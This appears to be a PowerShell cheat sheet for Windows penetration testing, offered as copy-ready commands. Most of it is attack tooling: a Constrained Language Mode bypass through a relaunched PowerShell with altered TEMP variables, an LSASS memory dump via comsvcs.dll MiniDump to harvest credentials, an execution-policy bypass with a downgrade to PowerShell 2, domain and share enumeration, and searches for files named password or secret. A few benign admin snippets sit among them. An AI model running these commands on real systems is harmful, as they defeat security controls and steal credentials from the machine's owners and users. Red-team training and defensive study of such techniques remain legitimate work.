# Powershell_stuff

#Check if Full or Constrained Language Mode is in place.   
	`$ExecutionContext.SessionState.LanguageMode   `

#Check if CredGuard is switched ON. (True = On)

	'CredentialGuard' -match ((Get-ComputerInfo).DeviceGuardSecurityServicesConfigured)   

#Set Proxy Settings Manually in Powershell (enter in Creds)

	$Wcl=New-Object System.Net.WebClient   
	$Creds=Get-Credential   
	$Wcl.Proxy.Credentials=$Creds   
	Invoke-WebRequest http://www.google.co.uk   

If you get a 200 back you're all good.

# CLM Bypass   
	#Path to Powershell
	$CMDLine = "$PSHOME\powershell.exe"

	#Getting existing env vars
	[String[]] $EnvVarsExceptTemp = Get-ChildItem Env:* -Exclude "TEMP","TMP"| % { "$($_.Name)=$($_.Value)" }

	#Custom TEMP and TMP
	$TEMPBypassPath = "Temp=C:\windows\temp"
	$TMPBypassPath = "TMP=C:\windows\temp"

	#Add the to the list of vars
	$EnvVarsExceptTemp += $TEMPBypassPath
	$EnvVarsExceptTemp += $TMPBypassPath

	#Define the start params
	$StartParamProperties = @{ EnvironmentVariables = $EnvVarsExceptTemp }
	$StartParams = New-CimInstance -ClassName Win32_ProcessStartup -ClientOnly -Property $StartParamProperties

	#Start a new powershell using the new params
	Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{
	CommandLine = $CMDLine
	ProcessStartupInformation = $StartParams
	}

	#lsass dump
	$processes = Get-Process
	$location = Get-Location

#.NET Framework Versions in place
```
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse |
Get-ItemProperty -name Version, Release -EA 0 |
Where-Object { $_.PSChildName -match '^(?!S)\p{L}'} |
Select-Object @{name = ".NET Framework"; expression = {$_.PSChildName}},
@{name = "Product"; expression = {$Lookup[$_.Release]}},Version, Release
```

#LSASS Dump
```
$dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass"){$process.id}}
		Write-Host "Found l s a s s process with ID $dumpid - starting dump with rundll32"
		Write-Host "Dumpfile goes to Get-Location\$env:COMPUTERNAME.log"
		rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $dumpid $location\$env:COMPUTERNAME.log full | Out-Null
		Compress-Archive -Path $location\$env:COMPUTERNAME.log -DestinationPath $location\$env:COMPUTERNAME.zip -CompressionLevel NoCompression
```


#ENABLE TLS1.2 if you receive a message Regarding an ISSUE with TLS   
```
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
```

#Execute Powershell with Exec bypass and stay in Version 2
```
powershell.exe -Version 2 -ExecutionPolicy bypass
```

#Powershell Specific Tooling

# PowerSharpPack
```
PowerSharpPack -SharpShares -Command "--shares"
```

#Domain Enumeration

#Group Membership  
```
([ADSISEARCHER]"samaccountname=$('ENTERUSERNAME')").Findone().Properties.memberof -replace '^CN=([^,]+).+$','$1' | sort-object
```

#Aliases
```
dir = Get-ChildItem
```

#Current Domain Password Policy
```
$domain = [adsi](“WinNT://DOMAIN.local”)
$domain.Properties.Keys | Foreach {
  @{$_ = [string]$domain.Properties.Item($_) }
}
```


#Search for any file with the extension (.doc, .xls, .pdf) export output to 'files.csv'
```
get-childitem .\ -rec -ErrorAction SilentlyContinue -include @(‘*.doc*’,’*.xls*’,’*.pdf’)|where{!$_.PSIsContainer}|select-object FullName,@{Name=’Owner’;Expression={(Get-Acl $_.FullName).Owner}},LastAccessTime,LastWriteTime,Length|export-csv -notypeinformation -path files.csv
```

#Or if you wanted to do several wildcard searches for sensitive files (replace the terms as necessary):
```
get-childitem .\ -rec -ErrorAction SilentlyContinue -include @(‘*password*’,’*sensitive*’,’*secret*’)|where{!$_.PSIsContainer}|select-object FullName,@{Name=’Owner’;Expression={(Get-Acl $_.FullName).Owner}},LastAccessTime,LastWriteTime,Length|export-csv -notypeinformation -path files.csv
```
